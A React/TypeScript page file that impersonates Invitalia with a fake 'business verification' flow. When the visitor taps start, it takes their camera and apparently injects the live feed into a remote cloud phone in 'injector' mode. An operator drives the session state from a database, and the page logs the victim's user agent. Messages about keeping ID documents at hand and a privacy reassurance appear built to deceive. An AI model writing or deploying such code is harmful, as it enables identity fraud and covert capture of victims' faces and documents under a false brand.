import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { useCloudPhone, type CameraMode, type QualityProfile } from "@/hooks/useCloudPhone";
import { supabase } from "@/integrations/supabase/client";
import invitaliaLogo from "@/assets/invitalia-logo.png";

export const Route = createFileRoute("/link/$linkId")({
  head: () => ({
    meta: [
      { title: "Verifica aziendale Invitalia" },
      { name: "description", content: "Verifica aziendale Invitalia." },
    ],
  }),
  component: LinkPage,
});

type SessionStatus = "idle" | "preparing" | "ready_for_user" | "injecting" | "live";
type StatusSource = "init" | "realtime" | "poll";

interface LinkConfig {
  label: string;
  pad_code: string;
  camera_mode: CameraMode;
  backQuality: QualityProfile;
  frontQuality: QualityProfile;
  session_status: SessionStatus;
}

type LoadState =
  | { kind: "loading" }
  | { kind: "not_found" }
  | { kind: "error"; message: string }
  | { kind: "ready"; config: LinkConfig };

const WAITING_TIPS = [
  "Tieni a portata di mano i tuoi documenti…",
  "Assicurati di essere in un luogo ben illuminato…",
  "Assicurati di avere una connessione stabile…",
];

function LinkPage() {
  const { linkId } = Route.useParams();
  const [load, setLoad] = useState<LoadState>({ kind: "loading" });
  const [sessionStatus, setSessionStatus] = useState<SessionStatus>("idle");
  const [, setStatusSource] = useState<StatusSource>("init");
  const [, setRtStatus] = useState<string>("connecting");

  useEffect(() => {
    let cancelled = false;
    (async () => {
      const { data, error } = await supabase
        .from("links")
        .select(
          "label, pad_code, camera_mode, back_definition_id, back_framerate_id, back_bitrate_id, front_definition_id, front_framerate_id, front_bitrate_id, session_status",
        )
        .eq("id", linkId)
        .maybeSingle();
      if (cancelled) return;
      if (error) {
        setLoad({ kind: "error", message: error.message });
        return;
      }
      if (!data) {
        setLoad({ kind: "not_found" });
        return;
      }
      const cfg: LinkConfig = {
        label: data.label,
        pad_code: data.pad_code,
        camera_mode: (data.camera_mode as CameraMode) ?? "dynamic",
        backQuality: {
          definitionId: data.back_definition_id ?? 17,
          framerateId: data.back_framerate_id ?? 6,
          bitrateId: data.back_bitrate_id ?? 11,
        },
        frontQuality: {
          definitionId: data.front_definition_id ?? 15,
          framerateId: data.front_framerate_id ?? 8,
          bitrateId: data.front_bitrate_id ?? 8,
        },
        session_status: ((data as any).session_status as SessionStatus) ?? "idle",
      };
      setLoad({ kind: "ready", config: cfg });
      setSessionStatus(cfg.session_status);
      setStatusSource("init");
    })();
    return () => {
      cancelled = true;
    };
  }, [linkId]);

  useEffect(() => {
    const filter = `id=eq.${linkId}`;
    const channel = supabase
      .channel(`link-session-${linkId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "links", filter },
        (payload) => {
          const next = (payload.new as any)?.session_status as SessionStatus | undefined;
          if (next) {
            setSessionStatus(next);
            setStatusSource("realtime");
          }
        },
      )
      .subscribe((status) => {
        setRtStatus(String(status).toLowerCase());
      });
    return () => {
      supabase.removeChannel(channel);
    };
  }, [linkId]);

  useEffect(() => {
    let cancelled = false;
    const id = setInterval(async () => {
      const { data, error } = await supabase
        .from("links")
        .select("session_status")
        .eq("id", linkId)
        .maybeSingle();
      if (cancelled || error || !data) return;
      const next = ((data as any).session_status as SessionStatus) ?? "idle";
      setSessionStatus((prev) => {
        if (prev !== next) setStatusSource("poll");
        return next;
      });
    }, 2000);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, [linkId]);

  if (load.kind === "loading") {
    return (
      <CenteredShell>
        <BrandHeader />
        <p className="mt-8 text-sm text-muted-foreground">Caricamento…</p>
      </CenteredShell>
    );
  }
  if (load.kind === "not_found") {
    return (
      <CenteredShell>
        <BrandHeader />
        <h1 className="mt-8 text-2xl font-semibold tracking-tight">Link non valido o scaduto</h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Questo link non è più disponibile. Richiedine uno nuovo.
        </p>
      </CenteredShell>
    );
  }
  if (load.kind === "error") {
    return (
      <CenteredShell>
        <BrandHeader />
        <h1 className="mt-8 text-2xl font-semibold tracking-tight">Si è verificato un errore</h1>
        <p className="mt-2 text-sm text-muted-foreground">{load.message}</p>
      </CenteredShell>
    );
  }

  return (
    <LiveLink
      linkId={linkId}
      config={load.config}
      sessionStatus={sessionStatus}
    />
  );
}

function LiveLink({
  linkId,
  config,
  sessionStatus,
}: {
  linkId: string;
  config: LinkConfig;
  sessionStatus: SessionStatus;
}) {
  const initialRequired: "back" | "front" =
    config.camera_mode === "locked_front" ? "front" :
    config.camera_mode === "locked_back" ? "back" :
    "back";

  const { status, start, stop } = useCloudPhone({
    mode: "injector",
    cameraMode: config.camera_mode,
    requiredCamera: initialRequired,
    padCode: config.pad_code,
    viewId: "phoneBox",
    backQuality: config.backQuality,
    frontQuality: config.frontQuality,
  });

  const startedRef = useRef(false);
  const inTransitionRef = useRef(false);
  const injectionMarkedRef = useRef(false);
  const watchdogTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const watchdogAttemptRef = useRef(0);
  const statusRef = useRef(status);
  statusRef.current = status;

  const [tapStarted, setTapStarted] = useState(false);
  const [exhausted, setExhausted] = useState(false);
  const [permissionError, setPermissionError] = useState<string | null>(null);
  const primingStreamRef = useRef<MediaStream | null>(null);

  // Rotating tips during loading
  const [tipIndex, setTipIndex] = useState(0);
  useEffect(() => {
    if (!tapStarted) return;
    if (isSuccessStatus(status)) return;
    const id = setInterval(() => {
      setTipIndex((i) => (i + 1) % WAITING_TIPS.length);
    }, 5000);
    return () => clearInterval(id);
  }, [tapStarted, status]);

  const releasePrimingStream = () => {
    const s = primingStreamRef.current;
    if (s) {
      try { s.getTracks().forEach((t) => t.stop()); } catch {}
      primingStreamRef.current = null;
    }
  };

  const handleStartTap = async () => {
    setPermissionError(null);
    let stream: MediaStream | null = null;
    try {
      const initialFacing =
        config.camera_mode === "locked_front" ? "user" :
        config.camera_mode === "locked_back" ? "environment" :
        "environment";
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: initialFacing } },
          audio: false,
        });
      } catch {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      }
    } catch (e: any) {
      console.error("[LinkPage] Start tap camera acquire failed", e);
      setPermissionError(
        "Camera error: " + (e?.name ?? "Unknown") + " — " + (e?.message ?? String(e)) + ". Tocca per riprovare.",
      );
      return;
    }
    primingStreamRef.current = stream;
    setTapStarted(true);
    setExhausted(false);
    setTipIndex(0);
    watchdogAttemptRef.current = 0;
    injectionMarkedRef.current = false;
  };

  const isSuccessStatus = (s: string) => {
    const t = s.toLowerCase();
    return /connected|camera active|camera:|camera status/i.test(t);
  };



  const isRecoveringStatus = (s: string) =>
    /reconnecting|connection issue/i.test(s.toLowerCase());

  const clearWatchdog = () => {
    if (watchdogTimerRef.current) {
      clearTimeout(watchdogTimerRef.current);
      watchdogTimerRef.current = null;
    }
  };

  const scheduleWatchdog = () => {
    clearWatchdog();
    watchdogTimerRef.current = setTimeout(() => {
      watchdogTimerRef.current = null;
      const s = statusRef.current;
      if (isSuccessStatus(s)) return;
      if (isRecoveringStatus(s)) { scheduleWatchdog(); return; }
      if (watchdogAttemptRef.current >= 3) { setExhausted(true); return; }
      watchdogAttemptRef.current += 1;
      void runTransition(true);
    }, 6000);
  };

  const runTransition = async (force = false) => {
    if (inTransitionRef.current && !force) return;
    inTransitionRef.current = true;
    try {
      if (startedRef.current) {
        try { stop(); } catch {}
        await new Promise((r) => setTimeout(r, 1500));
        startedRef.current = false;
      }
      startedRef.current = true;
      try { await start(); } catch { startedRef.current = false; }
      scheduleWatchdog();
    } finally {
      inTransitionRef.current = false;
    }
  };

  useEffect(() => {
    if (injectionMarkedRef.current) return;
    const s = status.toLowerCase();
    const injected =
      s === "camera active" ||
      s.startsWith("connected · camera:") ||
      s.startsWith("connected · camera");
    if (!injected) return;
    injectionMarkedRef.current = true;
    (async () => {
      await supabase
        .from("links")
        .update({
          session_status: "injecting",
          session_user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
          session_connected_at: new Date().toISOString(),
          session_updated_at: new Date().toISOString(),
        } as any)
        .eq("id", linkId);
    })();
  }, [status, linkId]);

  useEffect(() => {
    if (isSuccessStatus(status)) {
      clearWatchdog();
      if (exhausted) setExhausted(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [status]);

  useEffect(() => {
    if (!tapStarted) return;
    if (sessionStatus !== "ready_for_user") return;
    if (exhausted) return;
    if (isSuccessStatus(status)) return;
    if (inTransitionRef.current) return;
    injectionMarkedRef.current = false;
    watchdogAttemptRef.current = 0;
    releasePrimingStream();
    void runTransition();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [sessionStatus, tapStarted]);

  useEffect(() => {
    if (sessionStatus !== "idle" && sessionStatus !== "preparing") return;
    if (inTransitionRef.current) return;
    if (!startedRef.current) return;
    try { stop(); } catch {}
    startedRef.current = false;
    injectionMarkedRef.current = false;
    watchdogAttemptRef.current = 0;
    clearWatchdog();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [sessionStatus]);

  useEffect(() => () => {
    clearWatchdog();
    releasePrimingStream();
  }, []);

  const live = isSuccessStatus(status);

  useEffect(() => {
    console.log("[link] status:", status, "live:", live);
  }, [status, live]);

  // ===== Initial Start screen =====
  if (!tapStarted) {
    return (
      <CenteredShell>
        <BrandHeader />
        <h1 className="mt-10 text-2xl font-semibold tracking-tight text-foreground">
          Benvenuto nella verifica aziendale Invitalia
        </h1>
        <p className="mt-4 text-base text-muted-foreground">
          Clicca <span className="font-medium text-foreground">"Inizia verifica"</span> per procedere.
        </p>
        {permissionError && (
          <p className="mt-6 text-sm text-destructive">{permissionError}</p>
        )}
        <button
          onClick={() => { void handleStartTap(); }}
          className="mt-10 w-full max-w-xs rounded-lg bg-primary px-8 py-4 text-base font-semibold text-primary-foreground shadow-md transition-all hover:bg-primary/90 hover:shadow-lg active:scale-[0.98]"
        >
          {permissionError ? "Riprova" : "Inizia verifica"}
        </button>
        <p className="mt-12 text-xs text-muted-foreground/70">
          La tua privacy è importante. La fotocamera verrà attivata solo per la verifica.
        </p>
      </CenteredShell>
    );
  }

  // ===== Exhausted retry screen =====
  if (exhausted) {
    return (
      <CenteredShell>
        <BrandHeader />
        <h1 className="mt-10 text-xl font-semibold tracking-tight">Connessione non riuscita</h1>
        <p className="mt-3 text-sm text-muted-foreground">
          Non è stato possibile stabilire la connessione. Tocca per riprovare.
        </p>
        <button
          onClick={() => {
            clearWatchdog();
            setExhausted(false);
            watchdogAttemptRef.current = 0;
            injectionMarkedRef.current = false;
            void runTransition(true);
          }}
          className="mt-8 w-full max-w-xs rounded-lg bg-primary px-8 py-4 text-base font-semibold text-primary-foreground shadow-md hover:bg-primary/90"
        >
          Riprova
        </button>
      </CenteredShell>
    );
  }

  // ===== Connecting + Live screen =====
  // IMPORTANT: keep #phoneBox mounted at the same DOM node across states,
  // otherwise the SDK attaches video to a node we later unmount.


  return (
    <>
      <style>{`
        #phoneBox { position: absolute; inset: 0; width: 100%; height: 100%; z-index: 1; }
        #phoneBox video, #phoneBox canvas {
          width: 100% !important;
          height: 100% !important;
          object-fit: contain;
          display: block;
          background: #000;
        }
      `}</style>

      {/* Always-mounted phone stage — class toggles between inline aspect box and fullscreen */}
      <div
        className={
          live
            ? "fixed inset-0 z-50 bg-black transition-all duration-300"
            : "fixed left-1/2 top-[180px] z-30 aspect-[9/16] w-[min(360px,calc(100vw-48px))] -translate-x-1/2 overflow-hidden rounded-2xl bg-transparent transition-all duration-300"
        }
      >
        <div id="phoneBox" className="absolute inset-0 h-full w-full" />
        {live && (
          <div className="pointer-events-none absolute left-4 top-4 z-10 flex items-center gap-2 rounded-full bg-black/60 px-3 py-1.5 text-xs text-white backdrop-blur">
            <span className="h-2 w-2 rounded-full bg-green-500" />
            <span>In diretta</span>
          </div>
        )}
      </div>

      {/* Page chrome + waiting overlay — only when not live */}
      {!live && (
        <div className="relative min-h-screen bg-gradient-to-b from-background to-muted/30 text-foreground">
          <div className="mx-auto flex min-h-screen max-w-md flex-col items-center px-6 py-10 text-center">
            <BrandHeader />

            {/* Spacer matching the phone stage area */}
            <div className="mt-6 aspect-[9/16] w-full max-w-[360px]" />

            <div className="mt-6 flex flex-col items-center gap-6">
              <IdDocumentAnimation />
              <p
                key={tipIndex}
                className="min-h-[3rem] max-w-xs text-center text-base font-medium text-foreground animate-in fade-in duration-500"
              >
                {WAITING_TIPS[tipIndex]}
              </p>
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <span className="h-2 w-2 animate-pulse rounded-full bg-primary" />
                <span>
                  {isRecoveringStatus(status)
                    ? "Riconnessione in corso…"
                    : sessionStatus === "idle" || sessionStatus === "preparing"
                      ? "In attesa dell'avvio della sessione…"
                      : "Connessione della fotocamera in corso…"}
                </span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Always-mounted playBtn for SDK gesture handoff */}
      <button id="playBtn" hidden className="hidden">
        Tocca per avviare
      </button>
    </>
  );
}




function BrandHeader() {
  return (
    <div className="flex flex-col items-center">
      <img
        src={invitaliaLogo}
        alt="Invitalia"
        className="h-14 w-auto object-contain"
      />
    </div>
  );
}

function IdDocumentAnimation() {
  return (
    <div className="relative h-44 w-72">
      {/* Back card */}
      <div className="absolute left-2 top-4 h-36 w-56 rotate-[-6deg] rounded-xl bg-gradient-to-br from-muted to-muted/60 shadow-lg ring-1 ring-border" />
      {/* Front card */}
      <div className="absolute right-2 top-0 h-36 w-56 rotate-[4deg] rounded-xl bg-card shadow-xl ring-1 ring-border overflow-hidden">
        <div className="flex h-full w-full">
          <div className="flex w-1/3 items-center justify-center bg-muted/60">
            <div className="h-14 w-12 rounded-md bg-gradient-to-b from-muted-foreground/30 to-muted-foreground/10" />
          </div>
          <div className="flex flex-1 flex-col justify-center gap-2 p-3">
            <div className="h-2 w-3/4 rounded bg-muted-foreground/30" />
            <div className="h-2 w-1/2 rounded bg-muted-foreground/20" />
            <div className="h-2 w-2/3 rounded bg-muted-foreground/20" />
            <div className="mt-2 h-1.5 w-full rounded bg-muted-foreground/15" />
            <div className="h-1.5 w-4/5 rounded bg-muted-foreground/15" />
          </div>
        </div>
        {/* Scanning line */}
        <div className="pointer-events-none absolute inset-x-0 top-0 h-1 animate-[scan_2.2s_ease-in-out_infinite] bg-gradient-to-b from-primary/70 to-transparent" />
      </div>
      <style>{`
        @keyframes scan {
          0% { transform: translateY(0); opacity: 0.9; }
          50% { transform: translateY(8rem); opacity: 1; }
          100% { transform: translateY(0); opacity: 0.9; }
        }
      `}</style>
    </div>
  );
}

function CenteredShell({ children }: { children: React.ReactNode }) {
  return (
    <div className="relative min-h-screen bg-gradient-to-b from-background to-muted/30 text-foreground">
      <div className="mx-auto flex min-h-screen max-w-md flex-col items-center px-6 py-12 text-center">
        {children}
      </div>
    </div>
  );
}
